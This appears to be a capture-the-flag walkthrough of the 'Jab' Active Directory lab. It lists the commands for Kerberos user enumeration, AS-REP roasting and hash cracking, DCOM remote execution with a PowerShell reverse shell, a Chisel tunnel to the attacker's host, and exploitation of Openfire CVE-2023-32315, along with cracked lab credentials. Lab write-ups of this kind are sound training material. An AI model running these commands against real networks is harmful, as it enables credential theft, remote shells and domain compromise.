# Jab - Active Directory Exploitation Walkthrough

This repository documents the full exploitation process of the **Jab** Active Directory lab machine from initial enumeration to full domain compromise. The lab simulates a Windows enterprise environment with Kerberos authentication, XMPP communication, and internal services like Openfire. The goal was to gain Domain Admin access through realistic attack paths.

---

## 🧭 Lab Overview

- **Target IP:** 10.10.11.4
- **Domain:** jab.htb
- **DC Hostname:** dc01.jab.htb
- **Environment:** Active Directory + XMPP/Openfire

---

## 🔍 Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oA nmap 10.10.11.4
Open Ports:

Kerberos (88), LDAP (389/636), SMB (445), RPC (135/593)

XMPP/Openfire (5222, 5269, 7070, 7443, 7777)

Domain: jab.htb

Host Enumeration
Added entries to /etc/hosts:

Copy
Edit
10.10.11.4 dc01.jab.htb jab.htb
👤 User Enumeration & XMPP Discovery
Kerberos User Enumeration
bash
Copy
Edit
kerbrute userenum --dc dc01.jab.htb -d jab.htb \
  /usr/share/spray/name-lists/statistically-likely-usernames/jsmith.txt -o kerbrute
Thousands of users were identified. Many were filtered for Kerberos pre-auth checks.

XMPP Enumeration via Pidgin
Installed Pidgin (XMPP client):

bash
Copy
Edit
sudo apt install pidgin
Created a test account

Discovered chat rooms and usernames (e.g., bdavis)

Later logged in as jmontgomery using credentials retrieved via AS-REP roasting

🔐 AS-REP Roasting & Password Cracking
Harvesting AS-REP Hashes
bash
Copy
Edit
impacket-GetNPUsers jab.htb/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
Cracking Hashes with Hashcat
bash
Copy
Edit
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
Credentials Recovered:

jmontgomery : Midnight_121

Used in Pidgin to access additional rooms and recovered another credential:

svc_openfire : !@#$%^&*(1qazxsw

📁 SMB & BloodHound Enumeration
SMB Access
bash
Copy
Edit
smbmap -u 'svc_openfire' -p '!@#$%^&*(1qazxsw' -H 10.10.11.4
No sensitive files found.

BloodHound Enumeration
bash
Copy
Edit
bloodhound-python -u svc_openfire -p '!@#$%^&*(1qazxsw' -d jab.htb -dc dc01.jab.htb -c all -ns 10.10.11.4
zip -r bloodhound.zip bloodhound
Analyzed in BloodHound via Neo4j. Found an attack path to the Domain Controller using DCOM execution.

🧨 DCOM Exploitation (Remote Code Execution)
RCE via DCOMExec (Impacket)
Generated PowerShell payload from revshells.com and used:

bash
Copy
Edit
impacket-dcomexec 'jab.htb/svc_openfire:!@#$%^&*(1qazxsw@dc01.jab.htb' '<encoded-powershell>'
Connected to reverse shell:

bash
Copy
Edit
rlwrap nc -nlvp 6658
✅ User Flag: 58b27f9faaec3dfdb2a94dad6a1e2175

🔄 Port Forwarding to Internal Web Interface
Discovered internal ports: 9090, 9091 (Openfire admin panel)

Pivot with Chisel
bash
Copy
Edit
chisel server -p 9999 --reverse
chisel client 10.10.14.123:9999 R:9090:127.0.0.1:9090
Accessed Openfire admin at: http://127.0.0.1:9090

Logged in as svc_openfire

⚙️ CVE-2023-32315 - Openfire RCE Exploitation
Cloned and used public exploit:

bash
Copy
Edit
git clone https://github.com/miko550/CVE-2023-32315.git
pip3 install -r requirements.txt
Uploaded malicious plugin through the Openfire admin panel to gain RCE.

PowerShell Payload Execution
powershell
Copy
Edit
powershell -nop -W hidden -noni -ep bypass -c "$client = New-Object..."
Caught shell:

bash
Copy
Edit
rlwrap nc -nlvp 4444
✅ Root Flag: 8f826f76eb871e0566058e6580760e8e

✅ Summary
Enumerated users via Kerberos and XMPP (Pidgin)

Performed AS-REP roasting and cracked passwords

Moved laterally through BloodHound-mapped DCOM path

Used Impacket to gain shell on DC

Pivoted with Chisel to internal admin panel

Gained RCE via Openfire plugin vulnerability (CVE-2023-32315)



Author: Farhanahmad Quraishi
